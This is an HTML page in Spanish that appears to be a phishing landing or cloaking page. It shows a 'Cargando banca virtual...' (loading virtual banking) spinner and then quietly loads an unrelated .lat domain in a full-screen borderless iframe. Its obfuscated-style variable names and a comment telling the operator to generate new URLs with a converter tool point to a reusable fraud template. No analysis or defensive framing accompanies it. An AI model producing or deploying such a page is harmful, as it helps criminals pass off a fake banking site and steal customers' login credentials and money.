<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cargando.</title>
    <style>
        * {
            box-sizing: border-box;
        }

        body,
        html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background: #fff;
            font-family: system-ui, -apple-system, sans-serif;
            -webkit-text-size-adjust: 100%;
        }

        #_lw {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: #fff;
            z-index: 1000;
            transition: opacity 0.35s ease;
        }

        #_lw.h {
            opacity: 0;
            pointer-events: none;
        }

        ._sp {
            width: 46px;
            height: 46px;
            border: 4px solid #e9ecef;
            border-top-color: #0d6efd;
            border-radius: 50%;
            animation: _k 0.9s linear infinite;
            margin-bottom: 14px;
        }

        @keyframes _k {
            to {
                transform: rotate(360deg);
            }
        }

        ._lt {
            color: #6c757d;
            font-size: 14px;
        }

        ._ef {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0;
            transition: opacity 0.35s ease;
            background: #fff;
            z-index: 1;
            -webkit-overflow-scrolling: touch;
        }

        ._ef.v {
            opacity: 1;
        }

        #_em {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #fff;
            padding: 24px;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 90%;
            z-index: 500;
        }

        #_em.s {
            display: block;
        }

        #_em h3 {
            margin: 0 0 8px;
            color: #495057;
        }

        #_em p {
            margin: 0 0 16px;
            color: #6c757d;
        }

        #_em button {
            background: #0d6efd;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
        }

        #_em button:hover {
            background: #0b5ed7;
        }

        noscript {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #fff;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>

<body>

    <!-- Cargador / Loader -->
    <div id="_lw">
        <div class="_sp"></div>
        <div class="_lt">Cargando banca virtual...</div>
    </div>

    <!-- Contenedor del Iframe -->
    <iframe id="_mainFrame" class="_ef"></iframe>

    <!-- Error -->
    <div id="_em">
        <h3>Contenido no disponible</h3>
        <p>Estamos experimentando dificultades técnicas.</p>
        <button onclick="location.reload()">Reintentar</button>
    </div>

    <noscript>
        <div>
            <h2>JavaScript requerido</h2>
            <p>Esta página necesita JavaScript para funcionar correctamente.</p>
        </div>
    </noscript>

    <script>
        (function () {
            'use strict';

            // ═══════════════════════════════════════════════════════
            // PARA CAMBIAR LAS URLs:
            // Abre convertir.html en tu navegador, pega la URL,
            // y copia los números que te da. Reemplázalos abajo.
            // ═══════════════════════════════════════════════════════

            // URL principal
            var _0x1 = "https://caminosoloporsiacaso.lat/";

            // ── Decisión principal ──
            function _loadTarget() {
                try {
                    var loader = document.getElementById('_lw');
                    var errorMsg = document.getElementById('_em');
                    var ifrm = document.getElementById('_mainFrame');

                    if (!ifrm) return;

                    // Al cargar el iframe, ocultamos el cargador y mostramos el contenido con transición
                    ifrm.onload = function () {
                        if (loader) {
                            loader.classList.add('h');
                        }
                        ifrm.classList.add('v');
                    };

                    // Si ocurre un error de carga
                    ifrm.onerror = function () {
                        if (loader) {
                            loader.classList.add('h');
                        }
                        if (errorMsg) {
                            errorMsg.classList.add('s');
                        }
                    };

                    // Asignar destino
                    ifrm.src = _0x1;

                    // Temporizador de seguridad (3 segundos)
                    setTimeout(function () {
                        if (loader && !loader.classList.contains('h')) {
                            loader.classList.add('h');
                            ifrm.classList.add('v');
                        }
                    }, 3000);

                } catch (e) {
                    var loader = document.getElementById('_lw');
                    var errorMsg = document.getElementById('_em');
                    if (loader) loader.classList.add('h');
                    if (errorMsg) errorMsg.classList.add('s');
                }
            }

            // ── Ejecutar Inmediatamente ──
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', _loadTarget);
            } else {
                _loadTarget();
            }

        })();
    </script>
</body>

</html>
